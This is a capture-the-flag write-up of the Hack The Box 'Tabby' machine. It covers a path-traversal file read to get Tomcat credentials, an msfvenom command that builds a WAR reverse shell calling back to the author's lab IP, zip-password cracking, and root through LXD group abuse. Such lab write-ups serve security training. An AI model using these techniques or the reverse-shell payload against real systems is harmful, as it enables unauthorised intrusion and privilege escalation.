---
layout: single
title: Tabby - Hack The Box
excerpt: "Tabby was an easy box with simple PHP arbitrary file ready, some password cracking, password re-use and abusing LXD group permissions to instantiate a new container as privileged and get root access. I had some trouble finding the tomcat-users.xml file so installed Tomcat locally on my VM and found the proper path for the file."
date: 2020-11-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-tabby/tabby_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - php
  - lfi
  - tomcat
  - password cracking
  - zip
  - password re-use
  - lxd
---

![](/assets/images/htb-writeup-tabby/tabby_logo.png)

Tabby was an easy box with simple PHP arbitrary file ready, some password cracking, password re-use and abusing LXD group permissions to instantiate a new container as privileged and get root access. I had some trouble finding the tomcat-users.xml file so installed Tomcat locally on my VM and found the proper path for the file.

## Portscan

```
snowscan@kali:~/htb/tabby$ sudo nmap -sC -sV -p- 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 23:13 EDT
Nmap scan report for tabby.htb (10.10.10.194)
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website - Port 80

There's a website running on the server with a typical hosting provider landing page.

![](/assets/images/htb-writeup-tabby/image-20200621231450618.png)

## Website - Port 8080

There's a default Tomcat installation on port 8080 but the password for the manager page has been changed and we can't log in.

![](/assets/images/htb-writeup-tabby/image-20200621231615067.png)

![](/assets/images/htb-writeup-tabby/image-20200621231712434.png)

## Find Tomcat credentials with PHP LFI

On the main website there's a link to a statement about some previous security breach: `http://megahosting.htb/news.php?file=statement`

![](/assets/images/htb-writeup-tabby/image-20200621231829387.png)

There's a very obvious arbitrary file read vulnerability in the `news.php` file and we can read any file with path traversal. Here I grabbed `/etc/passwd` and found the `ash` user:

![](/assets/images/htb-writeup-tabby/image-20200621232009306.png)

The Tomcat credentials are usually stored in the `tomcat-users.xml` file. I looked for it in `/etc/tomcat9/tomcat-users.xml` but the file wasn't there so instead I installed Tomcat locally and checked where it could be hidden:

```
snowscan@kali:/$ find / -name tomcat-users.xml 2>/dev/null
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```

![](/assets/images/htb-writeup-tabby/image-20200621232523769.png)

We  got the credentials: `tomcat / $3cureP4s5w0rd123!`

## Getting a shell with a WAR file

I can't log in to the Tomcat manager even with the credentials.

![](/assets/images/htb-writeup-tabby/image-20200621232743387.png)

But I can log in to the host-manager:

![](/assets/images/htb-writeup-tabby/image-20200621232848021.png)

I'll generate a WAR file with msfvenom to get a reverse shell:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f war -o met.war LHOST=10.10.14.11 LPORT=4444
```

To deploy the WAR file payload I'll use `https://pypi.org/project/tomcatmanager/`

![](/assets/images/htb-writeup-tabby/image-20200621233339795.png)

Then I'll get the file name of the JSP file generated:

![](/assets/images/htb-writeup-tabby/image-20200621233433491.png)

Browsing to `http://10.10.10.194:8080/met/vjreafuiffq.jsp` I can trigger the meterpreter shell:

![](/assets/images/htb-writeup-tabby/image-20200621233731397.png)

## Priv esc to user ash

In the website folder there's a backup zip file:

![](/assets/images/htb-writeup-tabby/image-20200621233913483.png)

The file is encrypted but we can crack the hash:

![](/assets/images/htb-writeup-tabby/image-20200621234129261.png)

There isn't anything interesting in the zip file but the same password is used by the ash user:

![](/assets/images/htb-writeup-tabby/image-20200621234231636.png)

## Privesc

Ash is a member of the `lxd` group:

![](/assets/images/htb-writeup-tabby/image-20200621234322444.png)

Members of the `lxd` group can create containers and by creating a container as privileged we can access the host filesystem with root privileges.

I'll upload an small Alpine Linux image, import it, then launch a new instance as privileged then I can read the flag from the host OS.

![](/assets/images/htb-writeup-tabby/image-20200621235145325.png)

![](/assets/images/htb-writeup-tabby/image-20200621235323717.png)

![](/assets/images/htb-writeup-tabby/image-20200621235444013.png)